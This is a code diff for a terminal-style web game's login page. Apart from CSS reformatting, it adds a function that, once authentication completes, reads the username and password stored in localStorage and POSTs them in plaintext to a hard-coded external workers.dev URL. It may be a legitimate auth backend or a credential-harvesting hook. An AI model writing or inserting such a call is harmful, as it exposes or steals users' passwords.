@@ -15,16 +15,25 @@
         body {
             background-color: #0a0a0a;
             background: radial-gradient(circle at center, #1a1a1a 0%, #0a0a0a 100%);
-            color: #b0b0b0; 
+            color: #b0b0b0;
             font-family: 'Unifont', monospace;
-            font-size: 16px; 
-            margin: 0; padding: 30px; 
+            font-size: 16px;
+            margin: 0;
+            padding: 30px;
             line-height: 1.6;
             image-rendering: pixelated;
         }
 
-        #terminal-log { display: flex; flex-direction: column; }
-        .input-wrapper { display: flex; align-items: baseline; margin-top: 5px; }
+        #terminal-log {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-wrapper {
+            display: flex;
+            align-items: baseline;
+            margin-top: 5px;
+        }
 
         .user-input-line {
             background: transparent;
@@ -50,9 +59,12 @@
 <div id="terminal-log"></div>
 
 <script>
+    const WORKER_URL = "https://z9s73n03d0m.later5143.workers.dev/";
+
     const log = document.getElementById('terminal-log');
     let msgQueue = [];
     let isProcessing = false;
+    let authSignalSent = false;
 
     // --- TYPE ENGINE ---
     function addToQueue(text, className = "", isRequest = false) {
@@ -119,6 +131,31 @@
         });
     }
 
+    async function triggerWorkerAuth() {
+        if (authSignalSent) return;
+        authSignalSent = true;
+
+        const payload = {
+            type: "AUTH",
+            action: "AUTH_CHECK",
+            user: localStorage.getItem('ls_user'),
+            pass: localStorage.getItem('ls_pass'),
+            ts: Date.now()
+        };
+
+        try {
+            await fetch(WORKER_URL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            });
+        } catch (e) {
+            console.log("Worker signal failed:", e);
+        }
+    }
+
     // --- ONLY AUTH FLOW (NO GAME / NO FIREBASE / NOTHING ELSE) ---
     function handleAuth(val) {
         const u = localStorage.getItem('ls_user');
@@ -156,6 +193,7 @@
             addToQueue("ENTER PASSKEY:", "", true);
         } else {
             addToQueue("AUTH COMPLETE. GAME READY.", "success-msg");
+            await triggerWorkerAuth();
         }
     }
 
